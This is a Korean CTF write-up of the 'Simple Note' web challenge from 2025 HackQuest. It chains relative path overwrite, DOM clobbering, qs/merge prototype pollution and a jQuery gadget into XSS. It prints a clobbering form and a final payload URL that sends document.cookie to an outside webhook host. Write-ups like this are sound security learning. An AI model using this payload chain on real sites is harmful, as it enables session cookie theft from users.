---
title: 2025 HackQuest - Simple Note
published: 2025-07-22
description: " "
tags: [CTF_Writeup, hackquest, kaist]
category: CTF
draft: false
---
카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.  
못 푼 한 문제가 아래에서 설명할 `Simple Note`보다 쉬운 문제였지만 헤메다 풀지 못했다. 

## Simple Note (Web)

```js
app.get('/track', (req, res) => {
  const id = req.query.id
  const p = posts.get(id)
  if (p && p.author !== req.session.user) p.views++
  res.end(p ? 'views:' + p.views : '')
})

app.get('/view', (req, res) => {
  const id = req.query.id
  const p = posts.get(id)
  if (!p) return res.status(404).send('not found')
  res.send(`<!doctype html><html><head><meta charset="utf-8">
    <script src="./config.js"></script>
    <script src="https://code.jquery.com/jquery-3.5.1.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/qs@6.10.2/dist/qs.js"></script>
    </head><body id="main">
    <div id="content">${DOMPurify.sanitize(p.html)}</div>
    <div id="out"></div>
    </body>
    <script>
    let data = {}
    function merge(target, source) {
      for (const key in source) {
        const value = source[key];
        if (value && typeof value === 'object') {
          if (!target[key]) {
            target[key] = {};
          }
          merge(target[key], value);
        } else {
          target[key] = value;
        }
      }
      return target;
    }

    const params = Qs.parse(location.search.slice(1), { 
        depth: window.options.depth ? window.options.depth : 5,
        allowPrototypes: window.options.allowPrototypes ? true : false,
        parameterLimit: window.options.parameterLimit ? window.options.parameterLimit: 5
     })
    merge(data, params)
    $.get('/track?id=', data)
    </script>
    </html>`)
})

app.get('/config.js', (req, res) => {
  res.send(`
  window.options = {}
  window.options.depth = 20;
  window.options.allowPrototypes = false;
  window.options.parameterLimit = 20;  
  `)
})
```

작성한 노트를 그대로 보여주는 서비스이다.
html 삽입은 가능하지만 `DOMPurify.sanitize()` 되어 들어가기에 바로 XSS는 불가능하다.  

qs@6.10.2에 `CVE-2022-24999` Prototype pollution 취약점이 존재하고, `merge()` 함수에서도 pp가 일어난다.
그러나 `allowPrototypes`가 false이기 때문에 바로 Prototype pollution 하는 것 또한 불가능하다.

일단 처음으로 해야할 건 RPO다.
```html
<script src="./config.js"></script>
```
상대 경로로 config.js를 로드하고 있기에 `/view/?id=id` 처럼 뒤에 `/`를 붙이면 config.js의 로드를 막을 수 있다.

어차피 allowPrototypes는 계속 false이다. 여기서 RPO를 일으키는건 window.options가 initialize 되지 않게 하기 위해서다.

window.options가 할당되어 있지 않기에 Dom Clobbering으로 options를 덮어 allowPrototypes를 true로 설정할 수 있다.

```html
<form name="options">
     <input name="allowPrototypes" value="true">
</form>
```

이렇게 Dom Clobbering 페이로드를 작성한다

이제 `Prototype pollution`이 가능해졌다. XSS는 여전히 불가능해보일 수 있지만
여기서 찾은 방법이 `Jquery XSS by prototype pollution` 이다.

`$.get('/track?id=', data)`를 마지막에 사용하기에 XSS를 트리거 할 수 있다.

[레퍼런스](https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md)를 약간 변형해서 xss를 성공시켰다

최종 페이로드는 이렇다
```
http://158.247.241.230:10897/view/?id=29f97926-66da-4d01-9a80-b69c6b49da52&[constructor][prototype][url]=data:text/javascript;charset=utf-8,document.location.href='https://webhook/test?q='+%2Bdocument.cookie;//&[constructor][prototype][dataType]=script&[constructor][prototype][crossDomain]=
```

`flag: hackquest2025{caf7088a3562e36cb29876b8dd45a3384f4b0d0533ecc2778234b845693eca03}`